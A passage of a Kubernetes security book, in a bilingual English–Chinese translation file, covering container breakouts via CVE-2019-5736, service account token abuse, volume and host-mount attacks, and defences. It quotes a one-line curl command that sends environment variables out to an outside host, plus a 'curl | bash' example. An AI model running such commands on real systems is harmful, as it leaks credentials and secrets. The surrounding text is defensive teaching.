  type: TYPE_NORMAL
- en: '[![2](Images/2.png)](#co_storage_CO1-2)'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
- en: Check for root in the process namespace.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
- en: '[![3](Images/3.png)](#co_storage_CO1-3)'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
- en: Check for kernel PIDs to verify we’re in the root namespace.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
- en: The form `nsenter --all --target ${TARGET_PID}` is used for entering all of
    a process’s namespaces, similar to `docker exec`.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
- en: 'This is different from volumes mounted from the host:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  id: totrans-122
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: This `redis` volume has the host’s disk mounted in the container, but it is
    not in the same process namespace and can’t affect running instances of the applications
    started from that disk (like *sshd*, *systemd*, or the `kubelet`). It can change
    config (including *crontab*, */etc/shadow*, *ssh*, and *systemd* unit files),
    but cannot signal the processes to restart. That means waiting for an event (like
    a reboot, or daemon reload) to trigger the malicious code, reverse shell, or implant.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
- en: Let’s move on to a special case of a filesystem vulnerability.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
- en: The /proc/self/exe CVE
  id: totrans-125
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The filesystem inside the container is created on the host’s filesystem, so
    however small it is, there’s still some possibility to escape.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
- en: Some situations where this may be possible are when the container runtime has
    a bug, or makes an incorrect assumption about how to interact with the kernel.
    For example, if it doesn’t handle a link or file descriptor properly, there is
    a chance to send malicious input that can lead to a container breakout.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
- en: One of those incorrect assumptions arose from the use of */proc/self/exe*, and
    CVE-2019-5736 was able to break out and affect the host filesystem. Each process
    namespace has this pseudofile mounted in the */proc* virtual filesystem. It points
    to the location that the currently running process (*self*) was started from.
    In this case, it was reconfigured to point to the host’s filesystem, and subsequently
    used to root the host.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-129
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: 'CVE-2019-5736 is the `runc` */proc/self/exe* vulnerability, in `runc` through
    1.0-rc6 (used by Docker, Podman, Kubernetes, CRI-O, and `containerd`). Allows
    attackers to overwrite the host `runc` binary (and consequently obtain host root
    access) by leveraging the ability to execute a command as root within one of these
    types of containers: (1) a new container with an attacker-controlled image, or
    (2) an existing container, to which the attacker previously had write access,
    that can be attached with `docker exec`. This occurs because of file-descriptor
    mishandling, related to */proc/self/exe*.'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
- en: A symlink to `self` points to the parent process of the `clone` system call.
    So first `runc` ran `clone`, then inside the container the child process did an
    `execve` system call. That symlink was mistakenly created to point to `self` of
    the parent and not the child. There’s more background on [LWN.net](https://oreil.ly/8tbdA).
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
- en: During the startup of a container—as the container runtime is unpacking the
    filesystem layers ready to `pivot_root` into them—this pseudofile points to the
    container runtime, for example `runc`.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
- en: If a malicious container image is able to use this link, it may be able to break
    out to the host. One way of doing this is to set the container entrypoint as a
    symlink to */proc/self/exe*, which means the container’s local */proc/self/exe*
    actually points to the container runtime on the host’s filesystem. The detail
    is shown in [Figure 6-5](#storage-proc-self-exe-diagram).
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
- en: Further to this, an attack on a shared library is required to complete the host
    escalation, but it’s not complex, and once complete, leaves the attacker inside
    the container with write access to the `runc` binary outside it.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
- en: An interesting feature of this attack is that it can be executed entirely from
    a malicious image, does not require external input, and is able to execute any
    payload as root on the host. This is a classic supply chain attack with a cloud
    native slant. It could be concealed within a legitimate container, and highlights
    the importance of scanning for known vulnerabilities, but also that this won’t
    catch everything and intrusion detection is required for a complete defensive
    posture.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
- en: '![Diagram of the /proc/self/exe breakout](Images/haku_0605.png)'
  id: totrans-136
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-5\. Diagram of the */proc/self/exe* breakout (source: [“A Compendium
    of Container Escapes”](https://oreil.ly/JBzVW))'
  id: totrans-137
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: Note
  id: totrans-138
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: Clearly the effects of CVE-2019-5736 were not the intended use of the link,
    and the assumption that the container runtime could allow a container image access
    to it was simply unvalidated. In many ways this highlights the difficulty of security
    and testing in general, which must consider malicious inputs, edge cases, and
    unexpected code paths. The vulnerability was discovered by the core `runc` developer
    concerned about security, Aleksa Sarai, and there was no prior evidence of it
    being exploited in the wild.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
- en: Sensitive Information at Rest
  id: totrans-140
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the following sections we discuss sensitive information at rest, specifically
    Secrets management. In Kubernetes, [Secrets](https://oreil.ly/m8B8Y) are by default
    stored unencrypted in `etcd` and can be consumed in the context of a pod via volumes
    or via environment variables.
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
- en: Mounted Secrets
  id: totrans-142
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The `kubelet` running on worker nodes is responsible for mounting volumes into
    a pod. The volumes hold plaintext Secrets, which are mounted into pods for use
    at runtime. Secrets are used to interact with other system components, including
    Kubernetes API authorization for service account Secrets, or credentials for external
    services.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-144
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: 'Kubernetes v1.21 introduces immutable ConfigMaps and Secrets that can’t be
    changed after creation:'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  id: totrans-146
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: Updates to the config or Secret must be done by creating a new Secret, and then
    creating new pods that reference it.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
- en: If a pirate can compromise a worker node and gain root privileges, they can
    read these Secrets and every Secret of each pod on the host. This means root on
    the node is as powerful as all the workloads it’s running as it can access all
    their identities.
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
- en: These standard service account tokens are limited JSON Web Tokens (JWTs) and
    never expire, and so have no automated rotation mechanism.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
- en: Attackers want to steal your service account tokens to gain deeper access to
    workloads and data. Service account tokens should be rotated regularly (by deleting
    them from the Kubernetes Secrets API, where a controller notices and regenerates
    them).
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
- en: A more effective process is bound service account tokens, which extend the standard
    service account token with a full JWT implementation for expiry and audience.
    Bound service account tokens are requested for a pod by the `kubelet`, and issued
    by the API server.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-152
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: '[Bound service account tokens](https://oreil.ly/o0zkY) can be used by applications
    in the same way as standard service account tokens, to verify the identity of
    a workload.'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
- en: The NodeAuthorizer ensures the `kubelet` only requests tokens for pods it is
    supposed to be running, to mitigate against stolen `kubelet` credentials. The
    attenuated permissions of bound tokens decrease the blast radius of compromise
    and the time window for exploitation.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
- en: Attacking Mounted Secrets
  id: totrans-155
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: A popular mechanism of Kubernetes privilege escalation is service account abuse.
    When Captain Hashjack gets remote access to a pod, they’ll check for a service
    account token first. The `selfsubjectaccessreviews.authorization.k8s.io` and `selfsubjectrulesreviews`
    APIs can be used to enumerate available permissions (`kubectl auth can-i --list`
    will show what permissions are available) if there is a service account token
    mounted.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: Kubernetes 提权的一种流行机制是服务账户滥用。当 Captain Hashjack 获得对 pod 的远程访问时，他们首先会检查服务账户令牌。如果挂载了服务账户令牌，则可以使用
    `selfsubjectaccessreviews.authorization.k8s.io` 和 `selfsubjectrulesreviews` API
    枚举可用权限（`kubectl auth can-i --list` 将显示哪些权限可用）。
- en: 'Or if we can pull binaries, [rakkess](https://oreil.ly/n5UVm) shows a much
    nicer view. Here’s an overprivileged service account:'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，如果我们可以拉取二进制文件，[rakkess](https://oreil.ly/n5UVm) 展示了一个更好的视图。这里是一个过度权限的服务账户：
- en: '[PRE10]'
  id: totrans-158
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '[![1](Images/1.png)](#co_storage_CO2-1)'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '[![1](Images/1.png)](#co_storage_CO2-1)'
- en: rakkess has some extended options. To retrieve all actions use `rakkess --verbs
    create,get,list,watch,update,patch,delete,deletecollection`.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: rakkess 具有一些扩展选项。要检索所有操作，请使用 `rakkess --verbs create,get,list,watch,update,patch,delete,deletecollection`。
- en: This is not a vulnerability, it’s just the way a Kubernetes identity works.
    But the lack of expiry on unbound service account tokens is a serious risk. The
    Kubernetes API server shouldn’t be accessible to any client that doesn’t directly
    require it. And that includes pods, which should be firewalled with network policy
    if they don’t talk to the API.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 这不是一个漏洞，而是 Kubernetes 身份工作的方式。但未绑定服务账户令牌的缺乏到期是一个严重的风险。 Kubernetes API 服务器不应该对任何不直接需要它的客户端开放。这包括
    pod，如果它们不与 API 通信，则应该通过网络策略进行防火墙设置。
- en: Operators that talk to the API server must always have a network route and an
    identity (that is, their service account can be used to identify them with Kubernetes,
    and perhaps other systems). This means they need special attention to ensure that
    their permissions are not too great, and they consider the system’s resistance
    to compromise.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 与 API 服务器交互的操作者必须始终具有网络路由和身份（即，他们的服务账户可用于识别它们与 Kubernetes，以及可能其他系统）。这意味着它们需要特别关注，以确保其权限不会过大，并考虑系统对抗妥协的能力。
- en: Storage Concepts
  id: totrans-163
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 存储概念
- en: In this section, we review Kubernetes [storage](https://oreil.ly/0Hneb) concepts,
    security best practices, and attacks.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们审查 Kubernetes 的 [存储](https://oreil.ly/0Hneb) 概念，安全最佳实践和攻击。
- en: Container Storage Interface
  id: totrans-165
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 容器存储接口
- en: The [Container Storage Interface](https://oreil.ly/clGLR) (CSI) uses volumes
    to integrate pods and external or virtual storage systems.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: '[容器存储接口](https://oreil.ly/clGLR)（CSI）使用卷将 pod 和外部或虚拟存储系统集成起来。'
- en: CSI allows many types of storage to integrate with Kubernetes, and contains
    drivers for most popular block and file storage systems to expose the data in
    a volume. These include block and elastic storage from managed services, open
    source distributed filesystems like [Ceph](https://ceph.io), dedicated hardware
    and network attached storage, and a range of other third-party drivers.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: CSI 允许许多类型的存储与 Kubernetes 集成，并包含用于公开卷中数据的大多数流行块和文件存储系统的驱动程序。这些包括来自托管服务的块和弹性存储，开源分布式文件系统如
    [Ceph](https://ceph.io)，专用硬件和网络附加存储，以及一系列其他第三方驱动程序。
- en: Under the hood these plug-ins “propagate” the mounted volumes, which means sharing
    them between containers in a pod, or even propagating changes from inside the
    container back to the host. When the host’s filesystem reflects volumes mounted
    by the container, this is known as “bi-directional mount propagation.”
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 在这些插件的内部，“传播”挂载的卷，意味着在一个 pod 中分享它们的容器之间，甚至将容器内部的更改传播回主机。当主机的文件系统反映了容器挂载的卷时，这被称为“双向挂载传播”。
- en: Projected Volumes
  id: totrans-169
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 投射卷
- en: Kubernetes provides special volume types in addition to the standard Linux offerings.
    These are used to mount data from the API server or `kubelet`s into the pod. For
    example, to [project container or pod metadata into a volume](https://oreil.ly/flMYI).
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: Kubernetes 提供了除了标准 Linux 提供的特殊卷类型。这些用于将数据从 API 服务器或 `kubelet` 挂载到 pod 中。例如，要将容器或
    pod 元数据 [投射到卷中](https://oreil.ly/flMYI)。
- en: 'Here is a simple example that projects Secret objects into a projected volume
    for easy consumption by the `test-projected-volume` container, setting permissions
    on the files it creates on the volume:'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 这里是一个简单的示例，将 Secret 对象投射到投射卷中，以便 `test-projected-volume` 容器轻松使用，并在卷上设置文件创建的权限：
- en: '[PRE11]'
  id: totrans-172
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Projected volumes take existing data from the same namespace as the pod, and
    make it more easily accessible inside the container. The volume types are listed
    in [Table 6-1](#table-volume-types).
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 投影卷从与 pod 相同的命名空间中获取现有数据，并更容易地在容器内访问。卷类型列在[表 6-1](#table-volume-types)中。
- en: Table 6-1\. Kubernetes volume types
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 表 6-1\. Kubernetes 卷类型
- en: '| Volume type | Description |'
  id: totrans-175
  prefs: []
  type: TYPE_TB
  zh: '| 卷类型 | 描述 |'
- en: '| --- | --- |'
  id: totrans-176
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| Secret | Kubernetes API server Secret objects |'
  id: totrans-177
  prefs: []
  type: TYPE_TB
  zh: '| Secret | Kubernetes API 服务器 Secret 对象 |'
- en: '| downwardAPI | Configuration elements from a pod or its node’s configuration
    (e.g., metadata including labels and annotations, limits and requests, pod and
    host IPs, and service account and node names) |'
  id: totrans-178
  prefs: []
  type: TYPE_TB
  zh: '| downwardAPI | 从 pod 或其节点配置（例如，元数据包括标签和注释、限制和请求、pod 和主机 IP，以及服务账户和节点名称）获取的配置元素
    |'
- en: '| ConfigMap | Kubernetes API server ConfigMap objects |'
  id: totrans-179
  prefs: []
  type: TYPE_TB
  zh: '| ConfigMap | Kubernetes API 服务器 ConfigMap 对象 |'
- en: '| serviceAccountToken | Kubernetes API server serviceAccountToken |'
  id: totrans-180
  prefs: []
  type: TYPE_TB
  zh: '| serviceAccountToken | Kubernetes API 服务器 serviceAccountToken |'
- en: 'This can also be used to change the location of a service account Secret, using
    the `TokenRequestProjection` feature, which prevents kubectl and its clients from
    auto-discovering the service account token. This obscurity—for example, hiding
    files in different locations—should not be considered a security boundary, but
    rather a simple way to make an attacker’s life more difficult:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 这还可用于更改服务账户 Secret 的位置，使用 `TokenRequestProjection` 功能，防止 kubectl 及其客户端自动发现服务账户令牌。例如，将文件隐藏在不同位置，这不应被视为安全边界，而是使攻击者生活更加困难的一种简单方法：
- en: '[PRE12]'
  id: totrans-182
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'Every volume mounted into a pod is of interest to an attacker. It could contain
    data that they want to steal or exfiltrate, including:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 每个挂载到 pod 中的卷对攻击者都具有兴趣。它可能包含他们想要窃取或外泄的数据，包括：
- en: User data and passwords
  id: totrans-184
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用户数据和密码
- en: Personally identifiable information
  id: totrans-185
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 个人可识别信息
- en: An application’s secret sauce
  id: totrans-186
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 应用程序的秘密配方
- en: Anything that has financial value to its owner
  id: totrans-187
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 对其所有者具有财务价值的任何内容
- en: Let’s now see how volumes can be attacked.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们看看如何攻击卷。
- en: Attacking Volumes
  id: totrans-189
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 攻击卷
- en: 'Stateless applications in containers do not persist data inside the container:
    they receive or request information from other services (applications, databases,
    or mounted filesystems). An attacker that controls a pod or container is effectively
    impersonating it, and can steal data from other services using the credentials
    mounted as Kubernetes Secrets.'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 在容器中的无状态应用程序不会将数据持久化在容器内：它们从其他服务（应用程序、数据库或挂载的文件系统）接收或请求信息。控制 pod 或容器的攻击者实际上在冒充它，并可以使用挂载为
    Kubernetes Secrets 的凭据从其他服务中窃取数据。
- en: 'The service account token mounted at */var/run/secrets/kubernetes.io/serviceaccount*
    is the container’s identity:'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 挂载在*/var/run/secrets/kubernetes.io/serviceaccount*的服务账户令牌是容器的身份：
- en: '[PRE13]'
  id: totrans-192
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: By default a service account token is mounted into every pod instance of a deployment,
    which makes it a rather general form of identity. It may also be mounted into
    other pods and their replicas. GCP’s Workload Identity refers to this as a “workload
    identity pool,” which can be thought of as a role.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 每个部署的 pod 实例默认都挂载一个服务账户令牌，这使其成为一种相当通用的身份形式。它也可能被挂载到其他 pod 及其副本中。GCP 的工作负载身份将其称为“工作负载身份池”，可以视为一种角色。
- en: Because the attacker is in the pod, they can maliciously make mundane network
    requests, using the service account credentials to authorize with cloud IAM services.
    This can give access to SQL, hot and cold storage, machine images, backups, and
    other cloud storage systems.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 因为攻击者在 pod 中，他们可以恶意发出平凡的网络请求，使用服务账户凭证来授权云 IAM 服务。这可以访问 SQL、热和冷存储、机器映像、备份和其他云存储系统。
- en: The user running a container’s network-facing process should have least privilege
    permissions. A vulnerability in a container’s attack surface, which is usually
    its network-facing socket, gives an attacker initial control of only that process.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 运行容器网络进程的用户应具备最低特权权限。容器的攻击面（通常是其网络接口）存在漏洞，使攻击者仅能控制该进程的初始控制。
- en: Escalating privilege inside a container may involve difficult exploits and hijinks
    for an adversary, setting yet another security botheration for attackers like
    Dread Pirate Hashjack, who may be more inclined to pivot to an easier target.
    Should they persist, they will be unable to penetrate further and must reside
    in the network for longer, perhaps increasing likelihood of detection.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 在容器内部升级权限可能涉及对敌人的难以捉摸的攻击和戏耍，对攻击者如同 Dread Pirate Hashjack 等人来说，这是另一个安全麻烦。如果他们坚持不懈，他们将无法进一步渗透，并且可能需要在网络中停留更长的时间，增加被检测到的可能性。
- en: In this example the pod has a mounted volume at */cache*, which it is protected
    by discretionary access control (DAC) like all other Linux files.
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，Pod 在 */cache* 处有一个挂载的卷，它受到像所有其他 Linux 文件一样的自主访问控制（DAC）保护。
- en: Warning
  id: totrans-198
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
  zh: 警告
- en: Out-of-context symlink resolution in mounted filesystems is a common route for
    data exfiltration, as demonstrated in the `kubelet` following symlinks as root
    in */var/log* from the */logs* server endpoint in this [Hackerone bug bounty](https://oreil.ly/USepT).
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 在挂载文件系统中上下文外符号链接解析是数据外泄的常见途径，如在这个 [Hackerone 漏洞悬赏](https://oreil.ly/USepT) 中展示的
    `kubelet` 以 root 身份从 */logs* 服务器端点中的 */var/log* 跟随符号链接。
- en: 'The `hostMount` in action:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: '`hostMount` 的实际应用：'
- en: '[PRE14]'
  id: totrans-201
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'The filesystem mounted on the volume:'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 挂载在卷上的文件系统：
- en: '[PRE15]'
  id: totrans-203
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: Here the app user that owns the container’s main process can write temporary
    files (like processing artifacts) to the mount, but only read the data in the
    *hft/* directory. If the compromised user could write to the *hft/* directory
    they could poison the cache for other users of the volume. If the containers were
    executing files from the partition, a backdoor dropped on a shared volume allows
    an attacker to move between all users of the volume that execute it.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，拥有容器主进程的应用用户可以将临时文件（如处理工件）写入挂载点，但只能读取 *hft/* 目录中的数据。如果受损用户可以写入 *hft/* 目录，他们可以为卷的其他用户植入缓存毒药。如果容器正在执行来自该分区的文件，共享卷上的后门允许攻击者在执行它的所有卷用户之间移动。
- en: In this case root owns *hft/* so this attack is not possible without further
    work by the attacker to become root inside the container.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，根用户拥有 *hft/*，因此攻击者必须进一步工作才能在容器内部成为 root，所以这种攻击是不可能的。
- en: Note
  id: totrans-206
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
  zh: 注意
- en: Containers generally execute only the applications bundled inside their image,
    to support the principles of determinism and container image scanning. Executing
    untrusted or unknown code, such as `curl x.cp | bash` is unwise. Similarly, a
    binary from a mounted volume or remote location should have its checksum validated
    before execution.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 容器通常只执行其镜像中捆绑的应用程序，以支持确定性和容器镜像扫描的原则。执行不受信任或未知代码，例如 `curl x.cp | bash` 是不明智的。类似地，应在执行之前验证来自挂载卷或远程位置的二进制文件的校验和。
- en: 'The security of the data relies on filesystem permissions. If the container
    maintainer hasn’t set up the filesystem or users correctly, there may be a way
    for an attacker to get to it. `setuid` binaries are a traditional route to escalate
    privilege, and shouldn’t be needed inside a container: privileged operations should
    be handled by init containers.'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 数据的安全性依赖于文件系统权限。如果容器维护者没有正确设置文件系统或用户，可能会有一种方式让攻击者访问它。`setuid` 二进制文件是提升特权的传统途径，在容器内部不应该需要它们：特权操作应该由初始化容器处理。
- en: But what if the attacker can’t get into the target pod with the volume mounted?
    They may be able to mount a volume to a rogue pod with stolen service account
    credentials instead. In this scenario the attacker has permission to deploy to
    a namespace, and so admission controllers are the last line of defense against
    stolen credentials. Preventing rootful pods can help to maintain the security
    of shared volumes, as well as process and devices in the pod or mounted from the
    host or network.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 但是，如果攻击者无法通过挂载卷访问目标 Pod，他们可能会使用窃取的服务账号凭据将卷挂载到恶意 Pod 上。在这种情况下，攻击者有权限部署到一个命名空间，因此准入控制器是防止凭据被窃取的最后防线。防止使用
    root 权限的 Pod 可以帮助维护共享卷、Pod 内或从主机或网络挂载的进程和设备的安全性。
- en: Root access in a pod is the gateway to trouble. Many attacks can be prevented
    by dropping to an unprivileged user in a Dockerfile.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: Pod 中的 root 访问是麻烦的入口。通过在 Dockerfile 中降级为非特权用户，可以防止许多攻击。
- en: Root is omniscient, the rogue’s raison d' être.
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 根用户是全知的，流氓的生存理由。
- en: The Dangers of Host Mounts
  id: totrans-212
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: '[主机挂载的危险性](https://oreil.ly/sGJgo)'
- en: 'As pointed out in an [Aqua blog post](https://oreil.ly/sGJgo) from 2019:'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 正如 2019 年 [Aqua 博客文章](https://oreil.ly/sGJgo) 所指出的：
- en: Kubernetes has many moving parts, and sometimes combining them in certain ways
    can create unexpected security flaws. In this post you’ll see how a pod running
    as root and with a mount point to the node’s /var/log directory can expose the
    entire contents of its host filesystem to any user who has access to its logs.
  id: totrans-214
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Kubernetes 有许多移动部件，有时将它们以某些方式组合可能会产生意想不到的安全缺陷。在本文中，您将看到一个作为 root 运行的容器，通过挂载到节点的
    /var/log 目录，可以向任何有权访问其日志的用户暴露其主机文件系统的全部内容。
- en: A pod may mount a directory of a host’s filesystem into a container, for example
    */var/log*. The use of a subdirectory does not prevent the container from moving
    outside of that directory. A symlink can reference anywhere on the same filesystem,
    so an attacker can explore any filesystem they have write access to using symlinks.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，一个 pod 可能将主机的文件系统目录挂载到容器中，例如 */var/log*。子目录的使用并不能防止容器移动到该目录之外。符号链接可以引用同一文件系统上的任何位置，因此攻击者可以使用符号链接探索他们具有写访问权限的任何文件系统。
- en: Container security systems will prevent this attack, but vanilla Kubernetes
    is still vulnerable.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 容器安全系统将阻止这种攻击，但普通的 Kubernetes 仍然容易受到攻击。
- en: The exploit in [kube-pod-escape](https://oreil.ly/dwQo4) demonstrates how to
    escape to the host via writable `hostPath` mount at */var/log*. With write access
    to the host an attacker can start a new pod by writing a malicious manifest to
    */etc/kubernetes/manifests/* to have the `kubelet` create it.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [kube-pod-escape](https://oreil.ly/dwQo4) 中的漏洞展示了如何通过可写的 `hostPath` 挂载点（位于
    */var/log*）逃逸到主机。具有对主机的写访问权限的攻击者可以通过向 */etc/kubernetes/manifests/* 写入恶意清单来使 `kubelet`
    创建新的 pod。
- en: Other Secrets and Exfiltraing from Datastores
  id: totrans-218
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 其他秘密和从数据存储中导出
- en: Pods have other forms of identity injected in, including SSH and GPG keys, Kerberos
    and Vault tokens, ephemeral credentials, and other sensitive information. These
    are exposed by the `kubelet` into the pod as filesystem mounts, or environment
    variables.
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: Pod 还注入了其他形式的标识，包括 SSH 和 GPG 密钥、Kerberos 和 Vault 令牌、临时凭证以及其他敏感信息。这些由 `kubelet`
    暴露到 pod 中作为文件系统挂载或环境变量。
- en: 'Environment variables are inherited, and visible to other processes owned by
    the same user. The `env` command dumps them easily and an attacker can exfiltrate
    them easily: `curl -d "$(env)" https://hookb.in/swag`.'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 环境变量是继承的，并对由同一用户拥有的其他进程可见。`env` 命令可以轻松地将它们导出，并且攻击者可以轻松地导出它们：`curl -d "$(env)"
    https://hookb.in/swag`。
- en: Mounted files can still be exfiltrated with the same relative ease, but are
    made marginally more difficult to read by filesystem permissions. This may be
    less relevant with a single unprivileged user that must read all its own Secrets
    anyway, but becomes relevant in case of shared volumes among containers in a pod.
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然已挂载的文件仍然可以相对容易地导出，但通过文件系统权限，这些文件被读取的难度会稍微增加。在一个必须读取其所有本身秘密的单一非特权用户的情况下，这可能不太相关，但在一个
    pod 中容器之间共享卷的情况下，这就变得重要了。
- en: Admission control policy (see [“Runtime Policies”](ch08.xhtml#policy-runtime-policies),)
    can prevent host mounts entirely, or enforce read-only mount paths.
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 准入控制策略（参见 [“运行时策略”](ch08.xhtml#policy-runtime-policies)）可以完全阻止主机挂载，或者强制只读挂载路径。
- en: We will cover this topic in more detail in [Chapter 7](ch07.xhtml#ch-hard-multi-tenancy).
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在 [第7章](ch07.xhtml#ch-hard-multi-tenancy) 中更详细地讨论这个主题。
- en: Conclusion
  id: totrans-224
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 结论
- en: 'Volumes hold a digital business’s most valuable asset: data. It can fetch a
    handsome ransom. You should prevent Captain Hashjack from accessing data using
    stolen credentials by using hardened build and deployment patterns. Assuming that
    everything will be compromised, using workload identity to scope cloud integrations
    to the pod, and assigning limited cloud access to dedicated service accounts,
    make an attacker’s life more difficult.'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 卷宗保存数字企业最宝贵的资产：数据。它可以索取丰厚的赎金。通过使用强化的构建和部署模式，阻止哈什杰克船长使用窃取的凭证访问数据。假设一切都会被妥协，使用工作负载标识来限定云集成到容器中，并为专用服务帐户分配有限的云访问权限，这会让攻击者的生活更加困难。
- en: Encrypting data at rest (in `etcd` and in the context of the pods consuming
    it) protects it from attackers, and of course your pods that face the network
    and mount valuable data are the highest impact targets to compromise.
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 在静态数据（在 `etcd` 和在消耗它的 pod 的上下文中）上加密数据可以保护免受攻击者侵害，当然，面向网络并挂载有价值数据的 pod 是最高影响目标。
